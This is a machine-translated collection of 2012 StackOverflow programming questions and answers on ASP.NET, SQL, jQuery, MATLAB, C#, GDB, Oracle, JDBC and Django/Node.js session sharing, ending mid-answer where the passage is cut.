# StackOverflow 问答 10446000-10446999

# javascript - ASP.NET 和 Javascript 链接和事件顺序

> ID：10446002
> 
> 赞同：2
> 
> 时间：2012-05-04T09:14:03.770
> 
> 标签：javascript, asp.net

**情况：**

我在 ASP.NET 中从一个带有标记和 javascript 的 HTML 文件、几个 .js 文件、样式表和 ASP.NET 页面上的一些额外的内联 javascript 构建一个页面。使用 ASP>NET 开发服务器主机在 Visual Studio 2010 中工作。

XML 和 js 文件由第三方提供，不能更改，其中一个 js 文件是“我们的”文件，可以更改。

HTML 文件是一个可以填写的问卷。目前，我们有一个“托管”HTML 文件并保存答案的桌面应用程序。

总体目标是将调查问卷托管在网站中，以便我们可以从网络上的桌面应用程序复制功能。Javascript 将用于复制 ASP.NET 没有的桌面应用程序。

HTML 文件包含`<script>`指向 js 文件的链接和标记后的一大块内联 javascript。**内联 javascript 中的一行（不是函数，是实际的代码行）调用“我们的”包含文件中的函数。**

在 ASP.NET 代码中，我从 HTML 文件中提取内容并将其应用于构建 ASP.NET 页面。CSS 链接、脚本链接、标记、内联脚本块等。所以输出响应如下所示：

```
<html>
    <head>
        <link to CSS>
        <script src=thirdparty.js>
        <script src=our.js>
    </head>
    <body>
        third party HTML markup
        <script>
            line of code here that calls function in our.js;
        </script>
        <script>
            desktop duplication code here;
        </script>
    </body>
</html> 
```

如果我复制 js 文件的内容并将它们作为内联脚本块构建到页面中，一切正常。如果我将它们作为链接包含，那么*有时*上面提到的行会在调试器中引发“函数未定义”错误。即它的行为就像没有加载/包含 javascript 文件一样。据我所知，这不应该发生，因为所有的 javascript 都应该在运行之前加载和解析。

**问题：**

javascript 是否乱序/异步加载？如果是这样，我怎样才能在运行该行之前强制所有 javascript 加载和解析。

**笔记：**

是的，我必须在 ASP.NET 中构建页面，“文件”是动态的，实际上是从 Web 服务中读取的，因此无法事先准备好。我正在尝试创建的是一种处理多个供应商问卷的通用方法。

第三方 javascript 和标记仅适用于 IE，因为它是一个遗留系统。

由于明显的原因，我无法显示实际代码。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-16T14:17:24.660

我找到了与我上面所说的问题无关的答案。

页面工作时 DOCTYPE 标记不存在，但页面失败时出现。所以问题是第三方标记不符合任何形式的标准，为了让它工作，浏览器必须处于怪癖模式，这是通过省略 DOCTYPE 标记来完成的。

一点都不明显。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-04T09:28:08.577

您是否尝试过使用准备就绪事件的文档来触发“此处调用 our.js 中的函数的代码行；”

如果你使用 jQuery，你会做这样的事情：

```
<script type="text/javascript">
  $(document).ready(function() {
    line of code here that calls function in our.js;
  })
</script> 
```

如果您不想使用 jQuery，请查看没有[jQuery 的 $(document).ready 等效项](https://stackoverflow.com/questions/799981/document-ready-equivalent-without-jquery)

另一种选择是在调用您的函数的 ASP.Net 页面的最底部添加标签，例如：

```
<html>
 <head>
  <link to CSS>
  <script src=thirdparty.js></script>
  <script src=our.js></script>
 </head>
 <body>
  third party HTML markup
  <script>
  desktop duplication code here;
  </script>
  <script>
   line of code here that calls function in our.js;
  </script>
 </body>
</html> 
```

# mysql - 比较和获取唯一数据，以逗号分隔存储

> ID：10446005
> 
> 赞同：1
> 
> 时间：2012-05-04T09:14:05.847
> 
> 标签：mysql

我有一个存储 error_code 和 error_type 的 mysql 数据库。

每个 Error_type 可以有多个 error_code 存储为逗号分隔。

这是一张桌子

id error_code error_type

1 300,200,444 拼写

2 333,310 克

如图所示 ; 拼写有3个error_code

问题：如果error_code只有300或200或444，如何查询得到error_type（文本框中只会输入1个错误代码）

让我知道是否需要任何信息或不清楚.... tnx

编辑：

我需要一个独特的 error_type

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-04T09:22:05.733

您可以使用正则表达式：

```
select * from test
where error_code REGEXP '(^444,|,444$|,444,|^444$)' 
```

这将确保`444`出现在开头、结尾或两个逗号之间；它*不会*`444`匹配另一个数字内的字符串。例如，`1,2,34445,6`将不匹配。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-04T09:20:57.323

您可以使用`like`

```
select error_type from table where error_code like '%300%' 
```

或者

```
select error_type from table where error_code like '%444%' 
```

# hibernate - 将 Hibernate Profiler 与 Logback 一起使用

> ID：10446007
> 
> 赞同：5
> 
> 时间：2012-05-04T09:14:17.513
> 
> 标签：hibernate, log4j, profiler, logback

当使用 Hibernate Profiler 和使用 Logback 而不是 Log4J 进行日志记录的应用程序时，我们必须将 Hibernate Profiler Log4J appender 移植到 Logback appender。例如，[这里](https://stackoverflow.com/questions/974817/does-logback-support-log4j-appenders)对此进行了描述。

有人已经开发了这个附加程序吗？

# sql-server-2008 - 将参数传递给 SQL Server 标量值函数时出现语法错误

> ID：10446008
> 
> 赞同：1
> 
> 时间：2012-05-04T09:14:18.630
> 
> 标签：sql-server-2008

我在下面写了 SQL Server Scalar-Valued 函数来获取指定表中指定列的数据。我将表名及其列名传递给函数。但是根据这个系统税，我不能给函数@table参数，它要求我声明它。这可能是由于我在这里使用了错误的语法。谁能帮我弄清楚？

```
USE [mydatabse]
GO

SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO

ALTER FUNCTION [dbo].[FnTDEVgroupConcat2]
    (@fieldName varchar(max),
    @table varchar(max)
    )

RETURNS varchar(max)
AS
BEGIN
    -- Declare the return variable here
    DECLARE @result varchar(max)

     set @result = (SELECT @fieldName + ',' FROM @table FOR XML PATH(''));

    -- Return the result of the function
    RETURN @result;

END 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-04T09:45:43.523

您不能使用变量/参数指定表名。您必须使用并[动态](http://www.sommarskog.se/dynamic_sql.html)`@table`构建您的查询。

您不能在函数中执行动态 SQL，因此您需要一个带有输出参数的[存储过程。](http://msdn.microsoft.com/en-us/library/ms187926.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-04T09:38:01.763

SQL 中没有表类型之类的东西。创建与您要在函数中使用的具有相同结构的用户定义表类型。探索如何创建用户定义类型，如 INT、VARCHAR 和其他创建表类型，然后您可以在函数中使用相同的类型。

# jquery - jQuery datetimepicker插件在附加到div而不是输入元素时不起作用

> ID：10446013
> 
> 赞同：0
> 
> 时间：2012-05-04T09:14:40.917
> 
> 标签：jquery, jquery-ui, datepicker, jquery-ui-datepicker, datetimepicker

我正在使用 jquery Trent Richardson datetimepicker 插件，它在链接到文本输入时工作正常（参见下面的链接）。

[http://jsfiddle.net/many_tentacles/xnn3M/1/](http://jsfiddle.net/many_tentacles/xnn3M/1/)

但是，当我将它附加到 div 以便选择器始终显示时，以及 altField 选项时，日期和时间在 altfield 中无法正确显示（请参见下面的链接）。如果我将 altField 添加到有效的版本中，我会产生类似的问题，所以我认为它可能与此有关。

[http://jsfiddle.net/many_tentacles/EyPm5/](http://jsfiddle.net/many_tentacles/EyPm5/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T13:55:43.690

您好，请在此处查看**工作演示**：http : [//jsfiddle.net/Dgnjn/](http://jsfiddle.net/Dgnjn/)

D'uh 不要忘记投票并接受:))

您可以使用 onSelect 事件：

```
$('#datetimepicker').datetimepicker({
    //altField: '#alternate',
    dateFormat: 'yy-mm-dd',
    timeFormat: 'hh:mm:ss',
    stepHour: 2,
    stepMinute: 10,
    onSelect: function(dateText, inst) { 
      var dateAsString = dateText; //the first parameter of this function
      var dateAsObject = $(this).datepicker( 'getDate' ); //the getDate method

        $('#alternate').val(dateAsObject);
       // alert(dateAsObject + '==> ' + $('#alternate').val());
   }

}); 
```

在这种情况下，第一个参数是选定的日期作为字符串。使用[parseDate](http://docs.jquery.com/UI/Datepicker/parseDate)将其转换为 JS 日期对象。

有关完整的 jQuery UI DatePicker 参考，请参阅[http://docs.jquery.com/UI/Datepicker](http://docs.jquery.com/UI/Datepicker)。

# matlab - 在不可见属性上同步多个轴

> ID：10446028
> 
> 赞同：3
> 
> 时间：2012-05-04T09:15:36.270
> 
> 标签：matlab, matlab-figure

## 情况

假设我在某些时候有位置坐标。假设数据看起来像

```
data = A[rand(100, 3), sort(rand(100, 1))] 
```

`data(:,1)`x坐标，`data(:,2)`y坐标，`data(:,3)`高度和记录时间在哪里`data(:,4)`。

我可以很容易地使用

```
pxy = subplot(2,2,1)            % Plot for X-Y-Data
plot(data(:,1), data(:,2))
ptx = subplot(2,2,2)            % Plot for T-X-Data
plot(data(:,4), data(:,1))
pty = subplot(2,2,3)            % ... and so on
plot(data(:,4), data(:,2))
pth = subplot(2,2,4)
plot(data(:,4), data(:,3)) 
```

现在，为了查看图形，同步轴会很棒。

## 关于可能性的初步想法

一种简单的方法可以`linkaxes`用于时间轴，例如

```
linkaxes([ptx, pty, pth], 'x') 
```

但是，这会使 xy 图保持不变。因此，较弱的问题是如何将 的 y 轴链接`ptx`到 的 x 轴`pxy`。

但让我们变得更复杂：

## 实际问题

假设我只有两个地块，`pxy`并且`pth`. 现在，每当我放大或平移`pxy`可见的时间跨度时，它会被`pxy`提取并`pth`相应地修改。类似地，缩放以一种方式`pth`改变`pxy`，即只有正确时间跨度内的数据可见。

这种方法应该是可扩展的，我可以绘制 4 个可能图的任意子集，并相应地完成链接。

知道如何做到这一点吗？

最佳解决方案仍然允许通过使用添加更多数据来修改该基础图`hold on`。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-04T10:21:26.023

您想要的（理论上）问题是 pxy 应该是可逆的，并且在离散域（matlab 是离散的）中，这变得更加不清楚。

假设您有两个点 P1=(x1,y1) 和 P2=(x2,y2) 在 pxy 中彼此靠近；如果 P1 和 P2 在 pxy 中可见，您希望 pxy 的轴窗口对应于 pth 上的哪个轴窗口？Pth1 还是 Pth2？您必须为此定义一些决策规则。也许基于您实际单击的两个（P1 或 P2）中的哪一个。

实际上，当用户更改 pxy 上的缩放时，您必须运行函数来更改轴，这可以按照此处的说明完成：http: [//www.mathworks.com/matlabcentral/answers/21627-triggering-changes-in-plot -带缩放功能](http://www.mathworks.com/matlabcentral/answers/21627-triggering-changes-in-plot-with-zoom-function)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-04T16:45:54.717

由于 Gunthers 的暗示，我能够自己解决问题。由于 Gunthers 的回答仍然需要进行大量研究，因此我在下面提供了自己的解决方案，以防万一有人在某个时候遇到类似的问题。

首先，我在轴对象中添加了作为 UserData 所需的大部分数据。我的绘图函数（仅用于两个绘图）大致如下所示：

```
sb1 = subplot(1, 2, 1);
plot(data(:,1), data(:,2));
axis equal;
sb2 = subplot(1, 2, 2);
plot(data(:,4), data(:,3));
set(sb1, 'UserData', struct('projection', 'xy', 'data', data, 'link', [sb2]));
set(sb2, 'UserData', struct('projection', 'th', 'data', data, 'link', [sb1]));
panzoom(sb1, 'setlimits');   % Those two lines ensure that the zoom limits won't get changed
panzoom(sb2, 'setlimits');   % over time. 
```

现在，我将处理程序设置为我的缩放功能：

```
z = zoom;
set(z, 'ActionPostCallback', @Track.synchronizePlots);
z = pan;
set(z, 'ActionPostCallback', @Track.synchronizePlots); 
```

最后，这就是魔法发生的地方：

```
function synchronizePlots(obj, ax)
    ax = ax.Axes;           
    ud = get(ax, 'UserData');

    if ud.projection == 'xy'
        % That is the part discussed in the comments above,
        % which is, as I freely admit, not very sensible on a strict
        % mathematical point of view. However, the result is good enough for my
        % purpose
        xrange = get(ax, 'XLim');
        yrange = get(ax, 'YLim');
        pointsvisible = ud.data(1,:) >= xrange(1) & ...
                        ud.data(1,:) <= xrange(2) & ...
                        ud.data(2,:) >= yrange(1) & ...
                        ud.data(2,:) <= yrange(2);
        r = [min(ud.data(4, pointsvisible)), max(ud.data(4, pointsvisible))];
        if length(r) == 0  % The trick above may fail if there is no point in the zoom region.
            return         % in that case we just do nothing.
        end
    else
        r = get(ax, 'XLim');  % Straightforward
    end

    for a = ud.link  % The function does not care about the number of figures that have to be changed.
        linkud = get(a, 'UserData');

        if linkud.projection == 'xy'
            % Again, changing the xy-plot is that only part we have to work.
            pointsintime = linkud.data(4,:) >= r(1) & ...
                           linkud.data(4,:) <= r(2);
            xrange = [min(linkud.data(1, pointsintime)), ...
                      max(linkud.data(1, pointsintime))];
            yrange = [min(linkud.data(2, pointsintime)), ...
                      max(linkud.data(2, pointsintime))];
            if length(xrange) > 0
                 set(a, 'XLim', xrange);
                 set(a, 'YLim', yrange);
                 axis(a, 'equal');
            end
        else
            set(a, 'XLim', r);
        end
    end 
```

希望对某人有所帮助。

# c# - 如何在C#中循环几个dos命令

> ID：10446031
> 
> 赞同：2
> 
> 时间：2012-05-04T09:15:43.387
> 
> 标签：c#, loops

```
mp.StartInfo.FileName = "E:\\Naag\\execute.bat";
mp.StartInfo.UseShellExecute = false;
mp.StartInfo.CreateNoWindow = true;
mp.StartInfo.RedirectStandardInput = true;
mp.StartInfo.RedirectStandardOutput = true;
for (i = StartSerialNo; i<EndSerialNo;i++)
{
    iCnt++;
    mp.StartInfo.Arguments = sFileName+StartSerialNo.ToString()+ " " + smyName;
    mp.Start();
    mp.WaitForExit();
} 
```

execute.bat 的参数是 filename4567 myname。现在 Execute.bat 将创建 4 个 .out 文件。

因为我想循环它 10 次，所以我应该有 40 个 .out 文件。但我只有 4 个 .out 文件。

这表明循环只进行了一次。那么出了什么问题呢？

如何在C#中循环dos命令？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T09:19:39.430

您的循环一直使用相同的文件名，这意味着它只是覆盖文件，您需要改变它。而不是使用

```
sFileName+StartSerialNo.ToString()+ " " + smyName; 
```

作为您需要使用循环计数器的名称`i`：

```
sFileName + i + " " + smyName; 
```

导致：

```
mp.StartInfo.FileName = "E:\\Naag\\execute.bat";
mp.StartInfo.UseShellExecute = false;
mp.StartInfo.CreateNoWindow = true;
mp.StartInfo.RedirectStandardInput = true;
mp.StartInfo.RedirectStandardOutput = true;
for (i = StartSerialNo; i<EndSerialNo;i++)
{
    iCnt++;
    mp.StartInfo.Arguments = sFileName + i + " " + smyName;
    mp.Start();
    mp.WaitForExit();
} 
```

在创建文件的行上的循环中放置一个断点会向您显示这一点（并且该循环实际上被执行了 10 次）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-04T09:20:02.700

发送到进程的参数在每个循环中都是相同的，因此 .bat 可能每次都创建相同的文件。

My guess (and it's just a guess) is that you mean:

```
mp.StartInfo.Arguments = sFileName+i.ToString()+ " " + smyName; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-04T09:20:16.097

I Guess, because you haven't shared your .bat code that the .bat is not creating the output correctly and overwriting the same 4 files.

# c++ - 在可执行文件上重复运行 GDB（并在崩溃/错误时停止）

> ID：10446034
> 
> 赞同：17
> 
> 时间：2012-05-04T09:15:58.183
> 
> 标签：c++, gdb

我试图找出一种方法来**重复**运行 GDB 的可执行文件，最好在错误时停止。

我在手册中找不到这样做的方法！

谢谢

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-05-04T09:24:24.167

我试过（在 Bash 中）：

```
while true ; do gdb -ex run a.out -ex quit ; done ; 
```

不幸的是，这被证明是相当棘手的，但它确实自动运行，当程序崩溃时（我用一个导致 SIGABRT 的旧程序进行测试），gdb 询问“程序正在运行。无论如何退出？（y或 n)"，所以只需按 n。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-08-08T05:18:27.593

我遇到了同样的问题，并想出了一个我认为是停止 BoBTFish 建议的无限循环的相当好的方法。

您可以使用虚拟文件的存在来控制循环，而不是`while true`循环，例如：

```
touch loopfile; while [ -f loopfile ] ; do gdb -ex run a.out -ex quit ; done ; 
```

当您想停止无限调试会话时，您可以在同一目录中打开一个新终端，并且您可以通过中断并从其中删除从`rm loopfile`同一终端退出：`control-c``loopfile``gdb`

```
^CQuit
A debugging session is active.

    Inferior 1 [process 11136] will be killed.

Quit anyway? (y or n) n
Not confirmed.
(gdb) shell rm loopfile 
(gdb) quit
A debugging session is active.

    Inferior 1 [process 11136] will be killed.

Quit anyway? (y or n) y 
```

希望这对将来的某些人有用，这似乎是调试间歇性问题的一种不错的（如果是骇人听闻的）方法。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2014-05-09T13:36:33.253

# 循环 + LD 路径 + 命令行参数示例

```
for i in {0..99}; do LD_LIBRARY_PATH=/some/path/to/libs gdb -ex 'set args arg1 arg2 arg3' -ex run ./execName -ex quit ; done 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-05-04T09:23:05.173

使用 shell 脚本重复运行`gdb`，并使用`--batch -x <cmdfile>`选项`gdb`指定一个命令文件，该文件只包含`run`运行程序的单词。所以是这样的：

```
$ echo run > cmdfile ; while gdb --batch -x cmdfile myprogram ; do : ; done 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2021-03-11T21:35:25.730

一种简单的方法是在代码末尾放置一个断点，并配置断点命令以再次运行程序。例如，如果您的程序总是通过最后一条主线（假设没有突然退出），那么您可以：

```
(gdb) b <last line of main here>
(gdb) commands
> run [command line args]
> end 
```

您可能只是 CTRL-C 停止执行。当然，如果 GDB 发现分段错误或另一个断点，GDB 将停止执行，从而允许您捕获错误。

对于大多数复杂的情况，您可以发挥您的想象力来寻找断点的好地方。例如，您可以在 exit() 函数上设置 bp。

# c# - Oracle 命令未返回所需结果

> ID：10446038
> 
> 赞同：0
> 
> 时间：2012-05-04T09:16:25.853
> 
> 标签：c#, .net, oracle, oracle10g, odp.net

我是在 .NET 上与 Oracle 合作的新手。我过去使用过 SQL，没有遇到过这个问题。我有一个使用此连接字符串连接到的 Oracle 服务器：

```
<add key="Test" value="Data Source=(DESCRIPTION=(ADDRESS_LIST=(ADDRESS=(PROTOCOL=TCP)(HOST=xxxx)(PORT=1521)))(CONNECT_DATA=(SERVICE_NAME=xxx))); User Id=xxxxxxx;Password=xxxxxx;"/>

   private OracleConnection Testconnection = new OracleConnection((string)new System.Configuration.AppSettingsReader().GetValue("Test", typeof(string))); 
```

然后，我正在打开连接，检查它是否已打开（已打开）并尝试执行以下 oracle 命令。

```
 var accountOpenDate = new OracleCommand("select creationDate from tbl_user where id=:userid", this.Testconnection);
        getIsbAaccountOpenDate.Parameters.Add(":userid", this.IsbUserId);
        string isbAccountOpenDate = getIsbAaccountOpenDate.ExecuteNonQuery().ToString(); 
```

Oracle命令是正确的，当我在sql developer中执行它时它可以工作，但是当我执行代码时，isbAccountOpenDate的值为-1。我已经尝试了一切，所以不知道该怎么办了。

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T09:38:47.513

我不是 ODP 专家，但我认为这是您的问题：

```
getIsbAaccountOpenDate.Parameters.Add(":userid", this.IsbUserId); 
.                                      ^ 
```

冒号在 SQL 语句中用于标识绑定变量，以便 SQL 编译器知道不要`USERID`在其范围内查找调用的内容。但这不是名称的一部分。如果您从参数分配中删除冒号，您的代码应该可以工作。或者至少因其他原因失败:)

* * *

顺便说一句，您正在发出 SELECT 语句，那么您为什么要起诉`executeNonQuery()`？不应该这样`executeScalar()`吗？（它应该`executeReader()`用于返回多条记录的查询。）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-04T09:39:08.947

尽管您必须使用冒号来标识 SQL 脚本中的参数，但它不是参数名称的一部分。此外，返回数据库标量值的正确方法是`ExecuteScalar`. 这可以解决您的问题：

```
var stm = "SELECT creationDate FROM tbl_user WHERE id=:userid;";
var cmd = new OracleCommand(stm, this.Testconnection);
cmd.Parameters.Add("userid", this.IsbUserId);
var result = (string) cmd.ExecuteScalar(); 
```

`System.Data.OracleClient`您可以在 MSDN中找到完整的参考资料： [OracleParameterCollection](http://msdn.microsoft.com/en-us/library/system.data.oracleclient.oracleparametercollection.aspx)、[OracleCommand.ExecuteScalar](http://msdn.microsoft.com/en-us/library/system.data.oracleclient.oraclecommand.executescalar.aspx)、[OracleCommand.ExecuteNonQuery](http://msdn.microsoft.com/en-us/library/system.data.oracleclient.oraclecommand.executenonquery.aspx)。

# jquery - 通过隐藏的交叉发布到模态 jquery 对话框中的 iframe 来维护会话的问题

> ID：10446039
> 
> 赞同：1
> 
> 时间：2012-05-04T09:16:27.103
> 
> 标签：jquery, forms, session, iframe, dialog

我正在尝试在对话框中将隐藏的 FORM 帖子发送到 iframe 以进行结帐。它是装满购物车并打开带有转移购物车的窗口以在其他地方结账的经典场景（checkoutUrl 在不同的服务器上）。

```
var form = $('<form>').attr({
    id : 'checkoutform',
    name : 'checkoutform',
    method : "post",
    enctype : "multipart/form-data",
    action : checkoutUrl,
    target : "checkout"
}).appendTo('body');
$('<input>').attr({
    type : 'hidden',
    name : 'osCsid',
    value : osCsid
}).appendTo(form);
var iFrame = $('#iframe');
if (iFrame.length == 0) {
    $('<iframe name="checkout" id="iframe" src=""></iframe>').appendTo('body');
    iFrame = $('#iframe');
}
iFrame.dialog({
    autoOpen : false,
    position : [ 'center', 'center' ],
    dialogClass : 'shit-theme',
    closeOnEscape : true,
    modal : true
});
form.submit();
iFrame.dialog('open');
form.remove(); 
```

当我检查我的网络日志时，我在加载 iframe 时看到了许多额外的请求：

```
Name         Method Status  Type       Initiator        Size   Time     Receiving     
checkout.php GET 302        text/html jquery.js:5763    542B    142ms   38ms
login.php    GET (canceled) undefined http://xdmhost/checkout.php 13B   123ms   
checkout.php GET (canceled) undefined jquery.js:5763    13B 3ms 
checkout.php GET (canceled) undefined jquery.js:5763    13B 3ms 
checkout.php GET (canceled) undefined jquery.js:5763    13B 5ms 
checkout.php GET (canceled) undefined jquery.js:5763    13B 31ms    
checkout.php GET (canceled) undefined jquery.js:5763    13B 21ms    
checkout.php POST 302       text/html Other            542B 134ms   93ms41ms
checkout.php GET 302        text/html jquery.js:5779    541B    194ms   63ms131ms 
```

我想要做的就是 POST 到结帐，这应该会导致重定向到登录。这里发生了什么？有什么想法吗？

# performance - 在数字范围列表中搜索数字

> ID：10446042
> 
> 赞同：1
> 
> 时间：2012-05-04T09:16:46.590
> 
> 标签：performance, algorithm, search, range

假设有一个数字范围列表，例如 {0,9},{14,18},{19,30}。

我想确定一个数字 N 是否在列表中。如果 N=15 ，答案将是肯定的，因为 15 在 {14,18} 范围内 如果 N=11 ，答案将为否，因为 11 不在列表中的这些范围内。

我的问题是：是否有任何有效的方法来确定此类问题的答案？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-04T09:24:56.937

如果您对范围列表进行排序，然后加入重叠范围，则可以通过二分搜索解决您的问题，即 O(log(N))，其中 N 是列表中的元素数。

对范围进行排序和连接后，您可以将范围列表放入一个数组中，例如 { a, b }, { c, d } 将变为 ( a, b, c, d )，然后在二分查找之后可能会检查您的号码是否在具有偶数和奇数位置的元素之间，然后您的号码在范围内，否则它就出局了。

二进制搜索是您有一个排序数组的地方，因此您可以将数组分成两个相等的部分，并将您的键值与数组值进行比较，将部分分开，然后选择上部或下部进行一次又一次划分。

如果您不使用二进制搜索，并且您的列表未排序，则每次都必须查看所有元素，这 O(N) 并且被认为是非常低效的。

如果您需要更详细的解释，请发表评论。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-04T09:35:50.897

如果范围列表动态变化，那么[区间树](https://en.wikipedia.org/wiki/Interval_tree)就是您要查找的数据结构。

# java - 使用spring jdbctemplate提取数据以加载到不同的数据库中

> ID：10446047
> 
> 赞同：5
> 
> 时间：2012-05-04T09:17:09.653
> 
> 标签：java, spring, jdbctemplate

我需要从我的数据库中的一些随机表中提取数据，并插入到不同数据库中的类似表中。

我不清楚如何编写一个可以处理所有表的通用方法。

```
this.jdbcTemplate.query("select * from TableName", new RowMapper() {
         @Override
         public Object mapRow(ResultSet resultSet, int i) throws SQLException {
             while(resultSet.next()){
//                Fetch data in a generic object for later updating in a different schema
             }
             return null;  //To change body of implemented methods use File | Settings | File Templates.
         }
     }); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-04T10:33:43.813

老实说，`JdbcTemplate`这不是此类任务的最佳选择。您需要对创建插入 SQL 进行一些一次性处理，`ResultSet`并且实际上没有任何一点可以使用`JdbcTemplate`（据我所知）。

无论如何，这就是我在纯 JDBC 中做你想要的副本的方式（`JdbcTemplate`如果你愿意，你可以采用相同的原则并将其压缩）：

```
Connection sourceConnection = null; 
Connection destinationConnection = null; 

PreparedStatement selectStatement = null;
PreparedStatement insertStatement = null;

ResultSet resultSet = null;

try
{
  sourceConnection = ...
  destinationConnection = ...

  selectStatement = sourceConnection.prepareStatement("SELECT * FROM table");
  resultSet = selectStatement.executeQuery();

  insertStatement = destinationConnection.prepareStatement(createInsertSql(resultSet.getMetaData()));

  int batchSize = 0;
  while (resultSet.next())
  {
    setParameters(insertStatement, resultSet);
    insertStatement.addBatch();
    batchSize++;

    if (batchSize >= BATCH_EXECUTE_SIZE)
    {
      insertStatement.executeBatch();
      batchSize = 0;  
    }
  }

  insertStatement.executeBatch();
}
finally 
{
  JdbcUtils.closeResultSet(resultSet);

  JdbcUtils.closeStatement(insertStatement);
  JdbcUtils.closeStatement(selectStatement);

  JdbcUtils.closeConnection(destinationConnection);
  JdbcUtils.closeConnection(sourceConnection);
} 
```

重要的是在`createInsertSql`和`setParameters`方法中发生了什么，它们都使用`ResultSetMetaData`来执行它们的操作。根据您使用的数据库，您需要稍微使用它们，但它们看起来像：

```
private String createInsertSql(ResultSetMetaData resultSetMetaData) throws SQLException
{
  StringBuffer insertSql = new StringBuffer("INSERT INTO ");
  StringBuffer values = new StringBuffer(" VALUES (");

  insertSql.append(resultSetMetaData.getTableName());

  for (int i = 1; i <= resultSetMetaData.getColumnCount(); i++)
  {
    insertSql.append(resultSetMetaData.getColumnName(i));
    values.append("?");

    if (i <= resultSetMetaData.getColumnCount())
    {
      insertSql.append(", ");
      values.append(", ");
    }
    else 
    {
      insertSql.append(")");
      values.append(")");
    }
  }

  return insertSql.toString() + values.toString();
} 
```

和：

```
private void setParameters(PreparedStatement preparedStatement, ResultSet resultSet) throws SQLException
{
  for (int i = 1; i <= resultSet.getMetaData().getColumnCount(); i++)
  {
    preparedStatement.setObject(i, resultSet.getObject(i)); 
  }  
} 
```

请注意，这仅适用于源数据库和目标数据库具有相同结构的表的情况。如果它们不同，您将不得不开始定义两者之间的映射，此时您最好购买 ETL 工具。

**关注评论**

插入/更新的事情要困难得多。

从`DatabaseMetaData`您需要获取主键并查询源表和目标表，确保查询按主键列排序。

Then as you iterate over the source result set you'd need to check the destination result set to see if the primary key columns match or are greater in ordering, creating insert or update sql accordingingly.

For example if you had simple integer keys in the source table 1, 2, 3, 4, 7 and in the destination table you had 1, 2, 4, 5, 6 then:

*   1 = update
*   2 = update
*   3 because it's before 4 can safely be an insert
*   4 = update
*   7 you need to iterate the destination result set until you've gone past 6 before you can know for certain that 7 is an insert.

Sorry if that's not that clear, it's hard to explain in static text.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-04T09:51:01.917

调用

```
this.jdbcTemplate.setDateSource(sourceDB) 
```

读取数据前

和

```
this.jdbcTemplate.setDateSource(targetDB) 
```

在写作之前。

在你的春天注册多个数据源并使用类似这样的东西

```
@Autowired
@Qualifier("writeDataSource")
public void setDataSource(DataSource writeDataSource) {
    this.jdbcTemplate = new JdbcTemplate(writeDataSource);
} 
```

# django - 使用 Django/Redis/Node.js 进行实时推/拉

> ID：10446050
> 
> 赞同：5
> 
> 时间：2012-05-04T09:17:15.273
> 
> 标签：django, node.js, redis

我正在尝试在具有类似架构的 Django 应用程序上添加实时更新，如下所述：http: [//lincolnloop.com/blog/2012/apr/23/ginger-tech-stack/](http://lincolnloop.com/blog/2012/apr/23/ginger-tech-stack/)。基本上，更新通过 Redis 从 Django 发送到 Node.js，然后通过 Socket.io 推送到连接的客户端。现在，我可以向所有连接的客户端广播，但在实际情况下，我只需要向与操作相关的客户端发送数据（例如：用户发布消息，只有他的联系人/订阅者收到此消息）。所以我需要在 Node.js 端进行某种身份验证来知道谁是谁。如何实现？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-05T13:07:04.903

到目前为止，这是我在 socket.io/node.js 中获取连接用户身份的解决方案（如果您有更好的解决方案，请随时发布）：

**在 Django 方面：**

*   修补 Django 以使用 json 而不是 pickle 对象来存储会话数据：

    ```
     diff --git a/django/contrib/sessions/backends/base.py b/django/contrib/sessions/backends/base.py
    index 5a637e2..cb4db54 100644
    --- a/django/contrib/sessions/backends/base.py
    +++ b/django/contrib/sessions/backends/base.py
    @@ -2,9 +2,9 @@
     import time
     from datetime import datetime, timedelta
     try:
    -    import cPickle as pickle
    +    import json
     except ImportError:
    -    import pickle
    +    import simplejson as json

     from django.conf import settings
     from django.core.exceptions import SuspiciousOperation
    @@ -75,21 +75,21 @@ def _hash(self, value):
             return salted_hmac(key_salt, value).hexdigest()

         def encode(self, session_dict):
    -        "Returns the given session dictionary pickled and encoded as a string."
    -        pickled = pickle.dumps(session_dict, pickle.HIGHEST_PROTOCOL)
    -        hash = self._hash(pickled)
    -        return base64.encodestring(hash + ":" + pickled)
    +        "Returns the given session dictionary as json and encoded as a string."
    +        data = json.dumps(session_dict)
    +        hash = self._hash(data)
    +        return base64.encodestring(hash + ":" + data)

         def decode(self, session_data):
             encoded_data = base64.decodestring(session_data)
             try:
                 # could produce ValueError if there is no ':'
    -            hash, pickled = encoded_data.split(':', 1)
    -            expected_hash = self._hash(pickled)
    +            hash, data = encoded_data.split(':', 1)
    +            expected_hash = self._hash(data)
                 if not constant_time_compare(hash, expected_hash):
                     raise SuspiciousOperation("Session data corrupted")
                 else:
    -                return pickle.loads(pickled)
    +                return json.loads(data)
             except Exception:
                 # ValueError, SuspiciousOperation, unpickling exceptions. If any of
                 # these happen, just return an empty dictionary (an empty session). 
    ```

**在 Node.js 方面：**

*   从“sessionid”cookie 中读取会话密钥：

    ```
